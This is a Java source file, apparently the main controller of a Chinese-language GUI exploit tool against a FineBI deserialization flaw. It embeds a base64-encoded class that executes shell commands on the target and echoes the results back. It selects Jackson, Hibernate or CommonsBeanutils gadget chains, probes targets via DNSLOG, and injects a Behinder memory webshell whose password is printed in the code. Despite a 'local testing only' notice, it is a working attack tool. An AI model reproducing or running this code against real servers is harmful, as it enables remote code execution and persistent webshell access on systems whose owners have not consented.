package com.example.frchannel;

import com.example.frchannel.payload.CommonsBeanutils183;
import com.example.frchannel.payload.Hibernate;
import com.example.frchannel.payload.JacksonSignedObject;
import com.example.frchannel.payload.URLDNS;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.*;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.stage.Window;
import javafx.util.Pair;
import org.apache.http.HttpHost;

import java.net.URL;
import java.util.Base64;
import java.util.ResourceBundle;

public class MainController implements Initializable {


    private final String echo = "yv66vgAAADQBFgoAAgCIBwCJCgANAIoHAIsKAA0AjAoABACNCgCOAI8KAI4AkAgAkQoADQCSCgANAJMIAJQHAJUHAGUJABEAlgoADQCXBwCYCgARAJkKAJoAmwgAnAoADQCdBwCeCACfCACgCgBLAKEKAKIAowoAogCkCAClCgBKAKYHAIAKAKIApwgAqAoALwCpCACqCACrBwCsCACtCACuCACvCACwBwCxCwApALILACkAswgAtAgAtQgAtgcAtwgAuAoALwCNCgAvALkKALoAuwoAvAC9CgAvAL4IAL8KAMAAwQoALwDCCADDCADECADFCADGCADHBwDIBwDJCgA/AMoKAD8AywoAzADNCgA+AM4IAM8KAD4A0AoAPgDRCgAvANIKAEoA0woAFgDUBwDVBwDWAQAFZ2V0RlYBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR2YXI1AQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBAAR2YXIwAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEdmFyMQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHZhcjIBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEdmFyMwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQANU3RhY2tNYXBUYWJsZQcA1wcAlQcAiwEACkV4Y2VwdGlvbnMBAAl3cml0ZUJvZHkBABcoTGphdmEvbGFuZy9PYmplY3Q7W0IpVgEABHZhcjQBAAR2YXI2AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQACW0IHAIkHAJ4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAR0aGlzAQAMTFRvbWNhdEVjaG87AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAAV2YXIxNQEAAWMBAAV2YXIxMgEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAV2YXIxNAEABXZhcjEwAQAFdmFyMTEBAAR2YXI5AQABSQEABHZhcjgBABBMamF2YS91dGlsL0xpc3Q7AQASTGphdmEvbGFuZy9UaHJlYWQ7AQABWgEAE1tMamF2YS9sYW5nL1RocmVhZDsHANUHANgHALcHALEHAHYBAApTb3VyY2VGaWxlAQAPVG9tY2F0RWNoby5qYXZhDADZANoBABBqYXZhL2xhbmcvT2JqZWN0DADbANwBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MAN0A2gwAcQDeBwDXDADfAOAMAOEA4gEAJG9yZy5hcGFjaGUudG9tY2F0LnV0aWwuYnVmLkJ5dGVDaHVuawwA4wDkDADlAOYBAAhzZXRCeXRlcwEAD2phdmEvbGFuZy9DbGFzcwwA5wBaDADoAOkBABFqYXZhL2xhbmcvSW50ZWdlcgwAcQDqBwDrDADsAO0BAAdkb1dyaXRlDADuAOkBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQATamF2YS5uaW8uQnl0ZUJ1ZmZlcgEABHdyYXAMAHEAcgcA2AwA7wDwDADxAPIBAAd0aHJlYWRzDABMAE0MAPMA9AEABGV4ZWMMAPUA9gEABGh0dHABAAZ0YXJnZXQBABJqYXZhL2xhbmcvUnVubmFibGUBAAZ0aGlzJDABAAdoYW5kbGVyAQAGZ2xvYmFsAQAKcHJvY2Vzc29ycwEADmphdmEvdXRpbC9MaXN0DAD3APgMAOEA+QEAA3JlcQEAC2dldFJlc3BvbnNlAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEABUV0YWdzDAD6APsHAPwMAP0BAAcBAQwBAgEDDABxAQQBAAdvcy5uYW1lBwEFDAEGAQcMAQgA9AEABndpbmRvdwEAB2NtZC5leGUBAAIvYwEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABxAQkMAQoBCwcBDAwBDQEODABxAQ8BAAJcQQwBEAERDAESAPQMARMBFAwAYABhDAEVAPQBAApUb21jYXRFY2hvAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAQamF2YS9sYW5nL1RocmVhZAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1nZXRTdXBlcmNsYXNzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAQoSSlWAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0TWV0aG9kAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAARzaXplAQADKClJAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7AQAHaXNFbXB0eQEAAygpWgEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXREZWNvZGVyAQAHRGVjb2RlcgEADElubmVyQ2xhc3NlcwEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBABhqYXZhL3V0aWwvQmFzZTY0JERlY29kZXIBAAZkZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAFKFtCKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEACGdldEJ5dGVzAQAEKClbQgEACmdldE1lc3NhZ2UAIQBKAEsAAAAAAAUACgBMAE0AAgBOAAAA1QADAAUAAAA4AU0qtgABTi0SAqUAFi0rtgADTacADToELbYABU6n/+osxwAMuwAEWSu3AAa/LAS2AAcsKrYACLAAAQANABMAFgAEAAMATwAAADIADAAAAAwAAgAN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";
    private final String mem = "";

//    private final String JacksonHibernate = "";

    public ComboBox Chain;
    private HttpHost PROXY = null;
    private String HOST = "127.0.0.1";
    private int PORT = 8080;

    public Menu ProxyLog;

    @FXML
    private TitledPane TP;

    @FXML
    private TextField cmd;

    @FXML
    private TextField url;

    @FXML
    private TextArea output;

    // 初始化
    @Override
    public void initialize(URL location, ResourceBundle resources) {

        this.TP.setCollapsible(false);
        this.output.setText("\n1. 本工具仅用于本地模拟环境测试, 适用于FineBI\n\n" +
                "2. 漏洞路径: /webroot/decision/remote/design/channel\n\n"+
                "3. 本工具支持jackson、hibernate、cb反序列化链来进行回显与注入内存马\n\n"+
                "4. 利用DNSLOG功能时在输入命令处输入例如：blo6bz.dnslog.cn");

        ObservableList<String> chains = FXCollections.observableArrayList(new String[]{"JacksonSignedObject", "Hibernate", "CommonsBeanutils183"});
        this.Chain.setItems(chains);
    }

    // 注意事项
    public void notice(ActionEvent actionEvent) {
        Alert alert = new Alert(Alert.AlertType.INFORMATION);
        alert.setTitle("注意事项");
        alert.setHeaderText(null);
        alert.setContentText("\n\n1. 本工具仅用于本地模拟环境测试, 适用于FineBI\n\n" +
                "2. 漏洞路径: /webroot/decision/remote/design/channel\n\n"+
                "3. 本工具支持jackson、hibernate、cb反序列化链来进行回显与注入内存马\n\n"+
                "4. 利用DNSLOG功能时在输入命令处输入例如：blo6bz.dnslog.cn\n\n");
        alert.showAndWait();
    }

    // 检测是否为空值
    public Boolean check(String s){
        return !s.isEmpty();
    }

    // 检测url是否合法
    public Boolean checkUrl(String url){
        return url.contains("https://") || url.contains("http://");
    }

    public byte[] getPayload(String chain,byte[] bytes) throws Exception {
        if (chain.equals("JacksonSignedObject")){
            return JacksonSignedObject.getPayload(bytes);
        } else if (chain.equals("Hibernate")) {
            return Hibernate.getPayload(bytes);
        } else if (chain.equals("CommonsBeanutils183")) {
            return CommonsBeanutils183.getPayload(bytes);
        }
        else {
            this.output.setText("Please use JacksonSignedObject or Hibernate or CommonsBeanutils183  to ExecCommand || InjectMem ");
            throw new Exception();
        }
    }


    // DNSLOG检测
    public void DnsLog(ActionEvent actionEvent) throws Exception {
        if (check(this.url.getText()) && checkUrl(this.url.getText())){
            if (check(this.cmd.getText())){
                byte[] payload = URLDNS.getPayload(this.cmd.getText());

                String res = attack.send(this.url.getText(),payload,null, this.PROXY);
                this.output.setText("Check on the remote server："+this.cmd.getText());

            }
            else {
                this.output.setText("Please Input Cmd !!!\n"+
                        "Like:  blo6bz.dnslog.cn");
            }
        }
        else {
            this.output.setText("Please Input Vul Url !!!\n"+
                    "Like: http://192.168.60.128:37799/webroot/decision/remote/design/channel");
        }
    }

    // 执行命令
    @FXML
    protected void ExecCommand(ActionEvent actionEvent) throws Exception {
        if (check(this.url.getText()) && checkUrl(this.url.getText())){
            if (check(this.cmd.getText())){
                byte[] bytes = Base64.getDecoder().decode(echo);
                byte[] payload = getPayload((String) this.Chain.getValue(),bytes);
                String res = attack.send(this.url.getText(),payload,this.cmd.getText(),this.PROXY);
                this.output.setText(res);
            }
            else {
                this.output.setText("Please Input Cmd !!!");
            }
        }
        else {
            this.output.setText("Please Input Vul Url !!!\n"+
                    "Like: http://192.168.60.128:37799/webroot/decision/remote/design/channel");
        }

    }


    // 注入内存马
    public void InjectMem(ActionEvent actionEvent) throws Exception {
        if (check(this.url.getText()) && checkUrl(this.url.getText())){
            byte[] bytes = Base64.getDecoder().decode(mem);
            byte[] payload = getPayload((String) this.Chain.getValue(),bytes);
            String res = attack.send(this.url.getText(),payload,null,this.PROXY);
            this.output.setText("尝试进行连接====\n1、注入Behinder内存马路径：/*\n2、连接密码：rebeyond\n3、请求头设置：moresec:wuhu\n=========================================\n"+res);

        }
        else {
            this.output.setText("Please Input Vul Url !!!\n"+
                    "Like: http://192.168.60.128:37799/webroot/decision/remote/design/channel");
        }
    }


    public void Proxy(ActionEvent actionEvent) {

        Dialog<Pair<String, String>> dialog = new Dialog<>();
        Window window = dialog.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((e) -> {
            window.hide();
        });
        dialog.setTitle("Setting Proxy");
        dialog.setHeaderText(null);

        GridPane grid = new GridPane();
        grid.setHgap(10);
        grid.setVgap(20);
        grid.setPadding(new Insets(20, 30, 10, 10));

        ToggleGroup group = new ToggleGroup();
        RadioButton enableRadio = new RadioButton("启用");
        enableRadio.setSelected(true);
        enableRadio.setMinWidth(90.0);
        RadioButton disableRadio = new RadioButton("禁用");
        disableRadio.setMinWidth(90.0);
        enableRadio.setToggleGroup(group);
        disableRadio.setToggleGroup(group);
        HBox hbox = new HBox();
        hbox.setSpacing(20.0);
        hbox.getChildren().add(enableRadio);
        hbox.getChildren().add(disableRadio);

        ComboBox<String> typeCombo = new ComboBox();
        typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP"}));
        typeCombo.getSelectionModel().select(0);
        typeCombo.setMinWidth(200);

        TextField host = new TextField();
        TextField port = new TextField();
        if (HOST != null){
            host.setText(HOST);
            port.setText(String.valueOf(PORT));
        }

        Button cancelBtn = new Button("退出");
        cancelBtn.setMinWidth(90.0);
        cancelBtn.setOnAction((e) -> {
            dialog.getDialogPane().getScene().getWindow().hide();
        });
        Button saveBtn = new Button("保存");
        saveBtn.setMinWidth(90.0);
        saveBtn.setOnAction((e) ->{
            if (enableRadio.isSelected()){
//                System.out.println(host.getText());
                if (!(host.getText().isEmpty() || port.getText().isEmpty())){
                    HOST = host.getText();
                    PORT = Integer.parseInt(port.getText());
                    if (typeCombo.getValue().equals("HTTP")){
                        HttpHost proxy = new HttpHost(HOST, PORT);
                        this.PROXY = proxy;
                        this.ProxyLog.setText("ProxyLog：Start HTTP @ /"+HOST+":"+PORT+" ...");
                    }
                }
                else {
                    this.ProxyLog.setText("ProxyLog：Please Input Host and Port ...");
                }
            }
            else {
                this.ProxyLog.setText(null);
                HOST = null;
                this.PROXY = null;
            }
            System.out.println(this.PROXY);

        });

        HBox hbox2 = new HBox();
        hbox2.getChildren().add(saveBtn);
        hbox2.getChildren().add(cancelBtn);
        hbox2.setSpacing(20.0);
        hbox2.setAlignment(Pos.CENTER);

        grid.add(hbox,1,0);
        grid.add(new Label("Type："), 0, 1);
        grid.add(typeCombo,1,1);
        grid.add(new Label("Host："), 0, 2);
        grid.add(host, 1, 2);
        grid.add(new Label("Port："), 0, 3);
        grid.add(port, 1, 3);
        grid.add(hbox2,1,4);

        dialog.getDialogPane().setContent(grid);
        dialog.showAndWait();
    }


}